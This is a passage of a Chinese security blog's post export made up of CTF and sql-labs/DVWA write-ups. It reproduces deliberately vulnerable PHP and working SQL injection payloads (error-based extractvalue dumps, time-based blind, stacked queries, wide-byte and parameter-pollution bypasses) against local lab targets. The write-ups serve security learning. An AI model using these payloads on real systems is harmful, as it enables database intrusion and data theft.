$result=mysql_query($sql) or die(mysql_error()); while($row=mysql_fetch_assoc($result))&#123; $first=$row[&apos;first_name&apos;]; $last=$row[&apos;last_name&apos;]; echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125;&#125;?&gt; 这关很明显是数字型注入，通过选择表单中的数字作为注入点，我们可以用burp抓包修改post的id值 这里id值虽然通过mysql_real_escape函数被转义处理，但是由于id没有被引号包裹，所以没有什么区别 先判断查询字段数 字段数为2 接下来爆库 爆表 爆列 因为这里单引号被包裹，所以users可以转成十六进制数从而绕过转义 爆数据 High这关有两个页面，一个页面用来输入id值，输入的id值经过sql查询后的信息显示在主页面上 输入id值的页面代码如下： 1234567891011&lt;?phpsession_start();if(isset($_POST[&apos;id&apos;]) &amp;&amp; isset($_POST[&apos;submit&apos;]))&#123; $_SESSION[&apos;id&apos;]=$_POST[&apos;id&apos;];&#125;echo &quot;Session ID:&quot;.$_SESSION[&apos;id&apos;];?&gt; 主页面代码如下： 123456789101112131415161718&lt;?phpsession_start();include(&quot;sql-connection.php&quot;);if (isset($_SESSION[&apos;id&apos;]))&#123; $id=$_SESSION[&apos;id&apos;]; $sql=&quot;SELECT first_name , last_name FROM users where user_id=&apos;$id&apos;&quot;; $result=mysql_query($sql) or die(mysql_error()); while($row=mysql_fetch_assoc($result))&#123; $first=$row[&apos;first_name&apos;]; $last=$row[&apos;last_name&apos;]; echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125;&#125;?&gt; 这关把post的id值赋值给session的id值 注入点仍然是id值 跟上面关卡没什么本质区别 爆库 爆表 爆列 爆数据","categories":[{"name":"dvwa-sql","slug":"dvwa-sql","permalink":"https://Foxgrin.github.io/categories/dvwa-sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"数字验证正则绕过","slug":"数字验证正则绕过","date":"2018-07-10T12:39:00.000Z","updated":"2018-07-10T13:28:30.327Z","comments":true,"path":"/posts/25617/","link":"","permalink":"https://Foxgrin.github.io/posts/25617/","excerpt":"Bugkuctf题库中的一道代码审计题,通过利用各种正则匹配函数特性最终得到flag","text":"Bugkuctf题库中的一道代码审计题,通过利用各种正则匹配函数特性最终得到flag 源代码如下： 12345678910111213141516171819202122232425262728293031&lt;?phperror_reporting(0);$flag = &apos;flag&#123;test&#125;&apos;;if (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;])&#123; $password = $_POST[&apos;password&apos;]; if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) //preg_match — 执行一个正则表达式匹配 &#123; echo &apos;flag&apos;; exit; &#125; while (TRUE) &#123; $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;; if (6 &gt; preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母 foreach ($ps as $pt) &#123; if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) $c += 1; &#125; if ($c &lt; 3) break; //&gt;=3，必须包含四种类型三种与三种以上 if (&quot;42&quot; == $password) echo $flag; else echo &apos;Wrong password&apos;; exit; &#125;&#125;?&gt; 请求方法必须为POST 首先弄明白正则匹配函数： preg_match：执行一个正则表达式匹配，匹配到则返回1，匹配不到则返回0 preg_match_all:执行一个全局正则表达式匹配，返回成功模式匹配的次数，并将匹配结果存储到一个数组中 两个函数的区别是preg_match第一次匹配成功后就停止匹配，而preg_match_all是匹配到字符串结束为止 再弄明白几个正则匹配的特殊字符： [:graph:] : 除空格，TAB外的所有字符[:punct:] : 任何标点符号[:digit:] : 任何数字[:upper:] : 任何大写字母[:lower:] : 任何小写字母 接下来来到第一个判断地方： 12345if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) //preg_match — 执行一个正则表达式匹配&#123; echo &apos;flag&apos;; exit;&#125; 如果这个if语句执行成功，那么我们就获取不到后面的flag值，所以不能让if执行，也就是preg_match必须返回1，即正则匹配成功 在看正则表达式’/^[[:graph:]]{12,}$/’ 必须以任意一个除空格，TAB外的标点符号开头和结尾，且出现至少12次 验证如下： 123456789&lt;?phpif(isset($_GET[&apos;password&apos;]))&#123; $password=$_GET[&apos;password&apos;]; $a=preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;,$password); echo &apos;$a=&apos;.$a;&#125;?&gt; 输入12个1，看到结果返回1 输入小于12个，看到结果返回0 这里需要注意，输入’+’ 会被当做是空格处理，要先将’+’进行URL编码%2b 综上，第一个输入要求，输入除空格,TAB外的字符至少十二次 在看下一个判断条件： 123$reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;if (6 &gt; preg_match_all($reg, $password, $arr)) break; 如果if语句成功执行，break退出循环，我们就得不到flag值 所以我们不能让if语句成功执行，也就是说要让全局匹配成功次数大于6次 在看正则表达式’/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/’ 因为是全局匹配，所以匹配成功的条件是检测到任何符号出现1次以上或者任何数字出现1次以上或者任何大写字母出现1次以上或者任何小写字母出现1次以上，一旦匹配成功一次，就开始检测下一次的匹配，这么说有点难理解，直接上代码验证： 1234567891011&lt;?phpif(isset($_GET[&apos;password&apos;]))&#123; $password=$_GET[&apos;password&apos;]; $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;; $a=preg_match_all($reg,$password,$arr); echo &apos;$a=&apos;.$a.&quot;&lt;br&gt;&quot;; print_r($arr);&#125;?&gt; 这里输入1aB. 匹配的过程是这样的:先检测到1，符合[:digit:]出现1次，继续检测，检测到a，符合[:lower:]出现1次，继续检测，以此类推，所以最后检测成功次数为4 同时也可以看出返回的数组有两个元素，第一个元素是整个匹配结果，第二个元素是子模式的匹配结果 关于返回数组的详情可以参考：https://blog.csdn.net/qq_27988539/article/details/77366329 这题因为不牵涉到数组，就不详细研究 重点关注成功匹配的次数 这里特别说明什么时候是一次匹配的结束，就是检测到不是属于同一种特殊字符为止，因为这里每种特殊字符可以出现1次或者多次，举个例子，我们输入 第一次匹配结束是检测到a字符，不符合[:digit:]，所以开始第二次匹配 因为这里要成功匹配6次以上，所以每种类型的字符必须间隔出现6次以上，结合第一个条件，字符出现12个以上，于是我们可以输入11aaBB..22cc 验证一下： 1234567891011121314151617&lt;?phpif(isset($_GET[&apos;password&apos;]))&#123; $password=$_GET[&apos;password&apos;]; if(0&gt;=preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;,$password))&#123; echo &apos;Wrong Format 1&apos;; exit; &#125; $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;; if(6&gt;preg_match_all($reg,$password,$arr))&#123; echo &apos;Wrong Format 2&apos;; exit; &#125; echo &apos;success&apos;;&#125;?&gt; 结果如下： 再来看第三个条件： 12345678$c = 0;$ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母foreach ($ps as $pt)&#123; if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) $c += 1;&#125;if ($c &lt; 3) break; 如果$c&lt;3，那么我们就得不到flag值，也就是说要让$c&gt;=3，即成功匹配三次或以上 即出现三种类型字符或以上，按上面的输入：11aaBB..22cc，就行了，验证一下： 1234567891011121314151617181920212223242526272829&lt;?phpif(isset($_GET[&apos;password&apos;]))&#123; $password=$_GET[&apos;password&apos;]; if(0&gt;=preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;,$password))&#123; echo &apos;Wrong Format 1&apos;; exit; &#125; $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;; if(6&gt;preg_match_all($reg,$password,$arr))&#123; echo &apos;Wrong Format 2&apos;; exit; &#125; $c=0; $ps=array(&apos;punct&apos;,&apos;digit&apos;,&apos;upper&apos;,&apos;lower&apos;); foreach($ps as $pt)&#123; if(preg_match(&quot;/[[:$pt:]]+/&quot;,$password))&#123; $c += 1; &#125; &#125; if($c&lt;3)&#123; echo &apos;Wrong Format 3&apos;; exit; &#125; echo &apos;success&apos;;&#125;?&gt; 再看最后一个关键条件： 1if(&quot;42&quot; == $password) echo $flag; 执行了这个语句我们才可以得到想要的flag，也就是password值等于’42’，因为类型都是字符串，所以password中的值必须等于42，结合上面的三个条件 成功的输入可以有： 42.000e%2b000000000 420.000000000000e-1","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/categories/代码审计/"}],"tags":[{"name":"php","slug":"php","permalink":"https://Foxgrin.github.io/tags/php/"}]},{"title":"url二次编码绕过","slug":"url二次编码绕过","date":"2018-07-10T12:10:00.000Z","updated":"2018-07-10T12:17:46.498Z","comments":true,"path":"/posts/9338/","link":"","permalink":"https://Foxgrin.github.io/posts/9338/","excerpt":"Bugkuctf题库中的一道代码审计题，通过url二次编码绕过过滤得到flag","text":"Bugkuctf题库中的一道代码审计题，通过url二次编码绕过过滤得到flag 源代码如下： 1234567891011121314&lt;?php$flag='flag&#123;xxxx&#125;';if(preg_match(\"/hackerDJ/\",$_GET['id']))&#123; echo \"not allowed\"; exit;&#125;$id=$_GET['id'];$id=urldecode($id);if(\"hackerDJ\" == $id)&#123; echo $flag;&#125;?&gt; 看代码第一感觉将hackerDJ进行一次URL编码即可绕过过滤 将一次编码后的值输入 发现自动转化成了hackerDJ，为什么呢，因为我们提交id值给服务器时，服务器会对id值自动url解码，所以要对hackerDJ进行二次URL编码才可以绕过 输入二次编码后的值 成功得到flag值","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/categories/代码审计/"}],"tags":[{"name":"php","slug":"php","permalink":"https://Foxgrin.github.io/tags/php/"}]},{"title":"extract变量覆盖","slug":"extract变量覆盖","date":"2018-07-10T11:37:00.000Z","updated":"2018-07-10T12:04:55.616Z","comments":true,"path":"/posts/25619/","link":"","permalink":"https://Foxgrin.github.io/posts/25619/","excerpt":"Bugkuctf题库中的一道代码审计题，通过巧妙利用file_get_contents函数特性来绕过extract变量覆盖","text":"Bugkuctf题库中的一道代码审计题，通过巧妙利用file_get_contents函数特性来绕过extract变量覆盖 源代码如下： 12345678910111213141516&lt;?php$flag=&apos;../readme.txt&apos;;extract($_GET);if(isset($shiyan))&#123; @$content=trim(file_get_contents($flag)); if($shiyan == $content)&#123; echo &apos;flag&#123;xxx&#125;&apos;; &#125; else&#123; echo &apos;oh,no&apos;; &#125;&#125;?&gt; 首先先弄明白几个函数： extract:该函数将数组的键名作为变量名，键名对应的键值作为对应的变量值，返回值为设置成功的变量个数 也就是说这里的extract($_GET)将我们GET的参数名作为变量名，参数值作为变量值 例子如下： 123456789101112&lt;?phpif(isset($_GET[&apos;shiyan&apos;]) $$ isset($_GET[&apos;flag&apos;]))&#123; $a=extract($_GET); echo &apos;$a:&apos;.$a; echo &apos;&lt;br&gt;&apos;; echo &apos;$shiyan:&apos;.$shiyan; echo &apos;&lt;br&gt;&apos;; echo &apos;$flag:&apos;.$flag;&#125;?&gt; 输出结果： 成功设置了两个变量，$shiyan和$flag，所以$a=2 file_get_contents：将文件内容作为字符串输出 例子如下： 1234567&lt;?php$flag=&apos;../readme.txt&apos;;$content=file_get_contents($flag);echo $content;?&gt; 输出结果 这里注意file_get_contents函数里的参数是$flag，也就是说我们GET进来的参数flag值会将之前的flag值覆盖掉，从而造成变量覆盖，而我们输入的flag值如果不为文件名，函数执行错误，$content会被赋值为空 例子如下： 12345678910&lt;?php$flag=&apos;../readme.txt&apos;;if(isset($_GET[&apos;flag&apos;]))&#123; extract($_GET); @$content=file_get_contents($flag); echo $content.&apos;1&apos;;&#125;?&gt; 输出结果： 要得到最终要的flag，就必须要让变量content值等于变量shiyan的值 所以我们可以让shiyan值也为空，这样flag值任意输入，只要不为文件名，就一定相等 另外，即使shiyan值为空，isset($shiyan)也是返回true的 12345678&lt;?php$shiyan=&quot;&quot;;if(isset($shiyan))&#123; echo &quot;11&quot;;&#125;?&gt; 输出结果：","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/categories/代码审计/"}],"tags":[{"name":"php","slug":"php","permalink":"https://Foxgrin.github.io/tags/php/"}]},{"title":"Bugkuctf-sql注入2","slug":"Bugkuctf-sql注入2","date":"2018-07-10T11:19:00.000Z","updated":"2018-07-10T12:25:05.822Z","comments":true,"path":"/posts/15184/","link":"","permalink":"https://Foxgrin.github.io/posts/15184/","excerpt":"Bugkuctf题库中的sql注入类题","text":"Bugkuctf题库中的sql注入类题 今天继续做web类的题 从题目给出的一段代码，查询各个函数的作用 可以看出，这段PHP程序过滤了数组里的关键字，且对我们输入的id的值进行了标签的剥离。一开始还不懂什么意思，没事我们来试一下就慢慢懂了 跟个注入题一样，输入id值为0,1时有返回值，其他无返回值 试试id=1’,id=1”,id=1’),id=1”)发现都未返回报错信息 就用基于时间的盲注试一下 咦，这时候居然爆出了这么一段话，再回头看看之前查询的函数，原来我们输入的id值中包含了数组中的敏感关键字，所以爆出了这段话，再看看strip_tags()这个函数，它能剥离输入字符串中的html标签，那我们试试，在敏感关键字中的出现位置加入&lt;&gt;标签 果然就没有爆出之前的那段话了，又因为网页没有睡5秒，所以再试试id=1 发现程序睡了5秒，说明没有对输入的id的值进行单引号或者双引号的包裹 再查查输出的列数 发现返回两列，于是接下来就是熟悉的注入 爆出当前使用的数据库为sql3 爆出它的数据表 根据题目提示爆出id=1的hash字段值","categories":[{"name":"Bugkuctf-sql","slug":"Bugkuctf-sql","permalink":"https://Foxgrin.github.io/categories/Bugkuctf-sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"Bugkuctf-sql注入1","slug":"Bugkuctf-sql注入1","date":"2018-07-10T11:10:00.000Z","updated":"2018-07-10T12:25:11.257Z","comments":true,"path":"/posts/14864/","link":"","permalink":"https://Foxgrin.github.io/posts/14864/","excerpt":"Bugkuctf题库中的sql注入类题","text":"Bugkuctf题库中的sql注入类题 今天试着开始做一些ctf的题目，因为最近刚好在学渗透，所以试着做了一下web类，做到一题sql注入题，按照之前学习的盲注方法，一开始先用/?id=1 紧接着再试着改变id的值，发现除了0,1返回结果都为空，就判断id为注入的变量 感觉节奏很好，便在/?id=1后面加了’，结果按照之前的经验会报错，然而这题的结果却是与之前没加引号的结果相同 在试着用 /?id=2’ union select 1,database() %23按照之前的经验会注出数据库的名字 然而结果依然为空… /?id=1’ and if(0&gt;1,1,sleep(5)) %23 会让程序睡5秒 然而结果并没有 通过查阅发现，原来这是一个有防御的php程序，使用了一个addslashed()函数，这个函数的作用是对用户输入的预定义字符前面加入转义字符‘\\’进行转义 执行这个php程序 可见当我们输入’后，经过addslashed()函数将’转化成\\’，就不再是一个单引号，从而避免了一般的注入，所以便产生了宽字节注入，其原理是当mysql使用gbk编码方式时，会将前两个字符看成一个汉字（当第一个字符ascii码大于128时（比如$df），才会达到汉字的范围），当我们输入单引号’时，mysql会调用转义函数将单引号变为\\’，其中\\的十六进制是%5c，mysql的GBK编码，会认为%df%5c是一个宽字节，也就是’ 運’，从而使单引号闭合（逃逸），进行注入攻击 当mysql接受客户端的数据后，会认为它的编码是character_set_client，然后将之转换成character_set_connection的编码，然后进入具体表和字段后，在转换成字段响应的编码，当查询结果产生后，会从表和字段的编码转换成character_set_results编码，返回给客户端 于是我们开始使用宽字节注入，发现开始报错了 爆一下查询字段数量，发现是2 爆数据库，发现数据库名为sql5 爆数据表，发现有key和test两个数据表 接下来爆列 可以发现出现了问题，原来是mysql中的转义函数将’test’的两个单引号前面都加了\\进行转义 因为题目有提示在key表的string字段下，于是查询 发现又出现了错误，查询后发现在用key替换key,或者用sql5.key，才能查询到结果","categories":[{"name":"Bugkuctf-sql","slug":"Bugkuctf-sql","permalink":"https://Foxgrin.github.io/categories/Bugkuctf-sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"sql-labs54-61","slug":"sql-labs54-61","date":"2018-07-09T17:49:00.000Z","updated":"2018-07-10T08:31:49.435Z","comments":true,"path":"/posts/58593/","link":"","permalink":"https://Foxgrin.github.io/posts/58593/","excerpt":"总结了sql-labs的一些挑战关卡","text":"总结了sql-labs的一些挑战关卡 Less54-61Less-54这里开始进入挑战关卡，明显比前面难度提升了很多 直接看源代码吧 首先导入两个php文件 先看看sql-connect-1.php 连接mysql数据库，选择challenges这个数据库 再看看functions.php 里面定义了一堆函数，后面会一个个用到，我们先放着继续看下面的代码 这句代码将php文件的路径取了出来，我们把$pag值输出到文件看看 继续看下面 利用到functions里面的函数了，看看table_name这个函数 在mysql命令行输入 将取到的表名赋值给$table 将取得的两个列名分别赋值给两个变量 接着来到判断语句 当我们一开始还没有点击提交和重置按钮时 来到else语句，然后一开始cookie字段中没有challenge值 执行data函数 返回sessid值 然后设置cookie值 然后需要我们get传入id值，输入id值后 执行这个函数 一开始时tryy值为0 可见这个tryy值就是我们输入id的次数 当我们输入Id的次数大于10时，就执行 删除cookie中challenge字段值 并且重定向到另一个php文件同时get一个id值，值为 而这个php就是检测如果不存在challenges数据库的话就建立challenges这个数据库 ，并建立一个表，这个表的表名是随机的，见如下代码 并往这个表中添加数据 当我们post key值后点击提交按钮 则进行一个判断的sql语句 如果我们post值在col1列中，则返回1，否则不返回 然后成功提交key后，重定向到建立表的php，重新建立challenges表 也就是说，这关整体思路就是利用id值进行注入，有10次尝试的机会，一开始已经告诉我们表名是challenges，要在表中拿到key值 那么我们开始注入 首先一开始仍然是判断id有没有被引号包裹 发现被单引号包裹，那么接下来判断返回列数 返回3列 那就可以联合注入了 爆数据库 爆表 爆列 我们要找的key应该是在第三个列 最后报出key，提交 Less-55这里没有报错信息，id被()包裹，尝试次数为14次，其他和之前关卡没有什么区别 Less-56Id被(‘’)包裹，剩下的跟之前关卡一样 Less-57Id被””包裹，剩下的和之前一样 Less-58这关输入id值发现并没有返回正确信息，而且这里尝试次数仅为5次 看一下源代码 这里定义了一个数组，并且将用了一个数组顺序反转的函数array_reverse() 写个test测试一下 如果是关联数组 然后根据我们输入的id值进行mysql查询，将查询结果的id值作为数组的索引 所以输出一定是数组里的内容，不可能得到我们想要的信息，但是这里有报错信息显示，所以我们可以考虑用报错注入 Less-59这里id没有被引号包裹，其他跟之前一样 Less-60Id被（“”）包裹，其他跟之前一样 Less-61这关id被((‘’))包裹，其他跟之前一样","categories":[{"name":"sql-labs","slug":"sql-labs","permalink":"https://Foxgrin.github.io/categories/sql-labs/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"sql-labs50-53","slug":"sql-labs50-53","date":"2018-07-09T09:08:00.000Z","updated":"2018-07-09T13:33:44.951Z","comments":true,"path":"/posts/58721/","link":"","permalink":"https://Foxgrin.github.io/posts/58721/","excerpt":"总结了sql-labs中关于order by 注入和堆叠注入结合的关卡","text":"总结了sql-labs中关于order by 注入和堆叠注入结合的关卡 Less50-53Less-50输入sort=1,2,3得到正常排序的表，输入sort=1’和sort=1”都报错，说明没有引号包裹 先试试rand() 再试试报错注入 延时注入 发现都可以正常注入 看一下源代码 发现多重查询 说明这关可以进行堆叠注入 发现添加了新的一行 被单引号包裹 Less-52 被单引号包裹，没有报错信息 对堆叠注入没有影响 Less-53 被单引号包裹，并且没有报错，依然对堆叠没有影响","categories":[{"name":"sql-labs","slug":"sql-labs","permalink":"https://Foxgrin.github.io/categories/sql-labs/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"sql-labs46-49","slug":"sql-labs46-49","date":"2018-07-09T08:38:00.000Z","updated":"2018-07-09T13:33:44.951Z","comments":true,"path":"/posts/15069/","link":"","permalink":"https://Foxgrin.github.io/posts/15069/","excerpt":"总结了sql-labs中关于order by后面的注入的一些关卡","text":"总结了sql-labs中关于order by后面的注入的一些关卡 Less46-49Less46首先页面呈现 要我们get方式输入一个名为sort的参数 那我们输入/?sort=1 发现输出了users表里面的信息 输入sort=2时，发现排序变化了，按照第二列username的值进行了排序，于是猜测sql语句为select * from users order by get[‘sort’]， 但是，又有个问题，之前的关卡都是将查询的结果利用mysql_fetch_array($result)=$row，这样都是输出一行结果，为什么这关输出了所有的结果 看一下源代码 Sql语句与猜想的一样 如果查询的结果不为空，那么 建立一个表格 Th标签能使里面的文件加粗并居中，td标签里的文本是默认向左对齐，不加粗 这是最关键的代码，和之前关卡不一样，这里用到了新的一个函数，mysql_fetch_assoc() 经过查询，这个函数与mysql_fetch_array区别只在于前者返回的是关联数组，而后者既能返回关联数组又能返回索引数组 而要返回多个结果，就需要while循环，如果不用while循环，那么只能返回一个查询结果 源代码搞懂了，那么怎么进行注入呢 输入sort=1 desc，变成降序排列，默认是asc，也就是升序排列 我们通过sql语句观察出这题注入点应该是order by 后面的数字 先认识一个随机查询，select * from users order by rand() Rand()函数是随机产生一个0到1之间的数字 可以看出两次产生的是不同的随机数 而如果在括号内指定参数即rand(0)和rand(1)，则会产生固定的随机数种子 随机查询就是利用rand()函数产生不同的随机数种子，这些产生的随机数进行order by 排序，order by后面的参数如果是产生固定的随机数种子，随机排序的表就是固定的 于是我们利用在rand()函数的参数中构造逻辑表达式，根据返回的表判断逻辑表达式的真假，从而进行注入，比如/?sort=rand(ascii(substr(database(),1,1))=115) 发现返回是rand(false)也就是rand(0)的随机排序表，说明上述逻辑表达式为假 我们再先试试union查询可不可以 报错了，是不是union 和order by不能一起使用了，我们在mysql命令行中测试一下，发现以下两种是不会报错的，一种是在联合两边的select 语句分别加括号，一种是将order by放入后面的select语句 为什么呢，经过查询发现union查询并不是只是简简单单的将两个子查询结果进行拼接，而是将两个查询结果统一查询，所以order by 应该放在最后一个子查询中 然而这关我们是在order by后进行注入，所以不能使用union注入 那能不能使用延时注入呢，也就是通过order by 1 and if(,1,sleep()) 我们先在mysql命令行中测试一下 发现sleep了18秒，猜测是因为有18秒的原因，至于为什么是排序成这样，请教学长，学长也无法解释，暂时将这个问题搁在一边，但是抛开这个问题，利用这个方法进行延时注入是可行的，经过测试只要保证order by后面的参数不会报错，就能执行and后面的语句，经过测试带小数的数字，任何字符和字符串，列名，1,2,3都不会报错，但只有列名和1,2,3当做参数，才会对表排序，其他都会得到原来的表 下面试试延时注入 成功延时9秒 再试试能不能通过and 进行报错注入 非常完美，那么就可以进行熟悉爆表爆列了 http://127.0.0.1/sqli/sqli-labs/Less-46/?sort=1%20and%20extractvalue(1,concat(0x3a,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),0x3a)) http://127.0.0.1/sqli/sqli-labs/Less-46/?sort=1%20and%20extractvalue(1,concat(0x3a,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),0x3a)) 那么count(),group by,floor(rand(0)2)的报错注入能不能在这里运用呢 http://127.0.0.1/sqli/sqli-labs/Less-46/?sort=1%20and%201=(select%20count(*)%20from%20information_schema.columns%20group%20by%20concat(0x3a,database(),0x3a,floor(rand(0)*2))) 没问题，但除此之外还有一种方法进行这种报错注入，就是利用sort=(select …)进行报错注入 还有一种方法，可以在order by后面的procedure analyse参数进行报错注入 但是这里又碰到一个问题，procedure analyse后面的报错注入，加入子查询语句会报错，原因未知，可能是语法错误，暂时来看这个方法只能注出库名，用户名和版本 Into outfile 注入 Less-47输入sort=1,2,3发现都得到原来的表，猜测sort可能被引号包裹，成为字符，所以排序后仍为原来的表，加个单引号 发现报错了，果然被单引号包裹了 先试试随机查询rand() 还是原来的表，说明这里用rand()是不行的 那么用and +报错注入 延时注入 另外一种报错注入，经过测试必须通过and 后面才能执行，之前关卡的sort=(select …)方法测试不会报错 Procedure analyse 报错注入 Less-48输入sort=1,2,3，发现正常排序，说明sort没有被引号包裹，输入1’ 发现没有报错，说明不返回报错信息，所以这关不能用报错注入 排除sort=(select count(*))注入和and +报错和procedure analyse 报错注入 那么试试sort=rand()注入 这是rand(true)排序的表 这是rand(false)排序的表 再试试 and +延时注入 导出文件 Less-49输入sort=1,2,3发现都得到原来的表，说明有引号包裹，在输入sort=1’，没有输出表，没有报错，说明被单引号包裹，并且没有返回报错信息 那么排除了报错注入，rand()，那只能延时注入和导出文件了 文件导出","categories":[{"name":"sql-labs","slug":"sql-labs","permalink":"https://Foxgrin.github.io/categories/sql-labs/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"sql-labs38-45","slug":"sql-labs38-45","date":"2018-07-09T08:07:00.000Z","updated":"2018-07-09T13:33:44.949Z","comments":true,"path":"/posts/5994/","link":"","permalink":"https://Foxgrin.github.io/posts/5994/","excerpt":"总结了sql-labs中堆叠注入的一些关卡","text":"总结了sql-labs中堆叠注入的一些关卡 Less38-45Less-38一开始做这关发现跟之前关卡没有什么区别，可以正常的注出数据库等信息 但是这关要考察的是堆叠注入，也就是多语句查询，我们在mysql命令行中就可以验证，在前面一个sql语句结尾加上;，再加入一个sql语句，mysql就会一起执行这两个sql语句 可以看出两个语句都执行了 然而在之前关卡试了一下，是不能堆叠注入，看看这关源代码，发现与之前关卡连接数据库的方式变化了 这里用了mysqli函数来连接数据库 查询一下mysqli连接方式跟之前mysql连接方式，大致区别就是mysqli是一种新型的连接方式，然后应用在本关就能支持堆叠注入，原因它有个支持多查询的函数 由于第二个查询是网页上是看不到结果，即使有错误信息也是看不到的，所以一般不用查询语句来堆叠注入 例如可以进行一些数据库数据表的增删改操作，然后在mysql命令行进行验证 例如创建一个数据表test 删去表test 往users表中添加信息 即使第二条语句出现错误，我们也不会看到报错信息，所以一定要保证输入的语句不会出现错误 Less-39这关跟上一关区别就在于id没有被包裹 Less-40这关id值被(‘’)包裹，其他的跟之前没区别 测试一下延时注入是否使用在堆叠注入 经过测试是不行的，因为服务器只会返回给我们的第一个语句查询结果，第二个语句虽然会执行，但是结果是不会返回给我们的 Less-41这关id没有被包裹，其余与之前关卡无区别 Less-42刚进入这关从页面来看有点像之前的二次注入，之前的二次注入思路是创建一个名为admin’#的用户，然后登陆这个用户，修改密码，由于修改密码页面的sql语句条件中的username是直接从session中取的，不经过过滤，所以通过二次注入，最终修改了admin用户的密码 而这关想创建新用户，发现 提示我们如果要创建新用户，就用黑客的方法 我们想到这几关的主题，堆叠注入，那么是不是可以通过堆叠注入，将admin’#用户名直接写入users表中，这样就不需要通过之前创建用户的方式来二次注入 看一下login.php的源代码 果然允许多查询 那么来找找注入点 发现password未经过过滤，所以我们就在password进行注入 成功登陆 并且添加admin’# 接下来登陆admin’# 并修改密码 发现admin密码被修改，成功通过堆叠注入实现二次注入 其他数据库和数据表增添，删改和之前关卡一样 另外本关还可以报错注入 Less-43 Password被（‘’）包裹，方法与上一关相同 Less-44这关没有报错信息，所以只能先延时注入 被单引号包裹 其他与之前关卡相同，就是不能报错注入了 Less-45一样没有报错信息，延时注入 被(‘’)包裹，其他与之前相同","categories":[{"name":"sql-labs","slug":"sql-labs","permalink":"https://Foxgrin.github.io/categories/sql-labs/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"sql-labs29-37","slug":"sql-labs29-37","date":"2018-07-09T07:13:00.000Z","updated":"2018-07-09T13:33:44.949Z","comments":true,"path":"/posts/56021/","link":"","permalink":"https://Foxgrin.github.io/posts/56021/","excerpt":"总结了sql-labs中HTTP参数污染和宽字节注入的一些关卡","text":"总结了sql-labs中HTTP参数污染和宽字节注入的一些关卡 Less29-37Less-29 首先页面信息展示的是“这个页面受到世界上最好的防火墙的保护” n 经过一系列盲注，发现都没有什么特别的地方 看一下源码，发现这关有隐藏的登录页面 输入id=1 输入id=1’ 发现直接跳转到另外一个页面，尝试一系列盲注，都被防火墙拦截下来 看一下login.php的源码 首先，我们输入的请求信息以字符串的方式被截取下来 然后这个字符串被以&amp;为分隔符组合成数组 并且如果有一个元素是id=(某个值)，这个值被截取下来赋值给id_value 并判断这个值，如果不是完全由数字组成的，则跳转到被防火墙拦截页面 这个处理实际上就是服务器处理数据的原理 http服务器实际上有两个，当客户端发送请求数据给服务器时，数据会先经过第一个tomcat服务器，tomcat服务器先处理第一个请求参数，再将数据交给第二个apache服务器，apache服务器处理最后一个请求参数，将结果返回给tomcat,tomcat再返回给客户端 也就是说当我们输入/login.php?id=1&amp;id=2，最后服务器处理的是id=2这个参数，也就是最后一个参数 这关的代码实际上就是模仿在tomcat服务器设置防火墙，从而进行数据过滤，防止攻击 所以我们就可以用第一个参数骗过服务器，通过最后一个参数进行sql注入，这就属于hpp，也就是http参数污染漏洞攻击 第一个参数输入纯数字，第二个参数进行注入 剩下的就跟之前相同了 Less-30这题跟上题区别在于id被双引号包裹，其他方法跟上题相同 Less-31这题id被(“”)包裹，其余和前两题一样 Less-32输入id=1 再输入id=1’ 发现我们输入的值被经过处理了 查看源代码 Preg_quote()这个函数作用是在正则表达式中将特殊字符转义，比如一些在正则表达式中具有特殊意义的字符*-?等，如果不加以转义会被认为是特殊字符无法替换 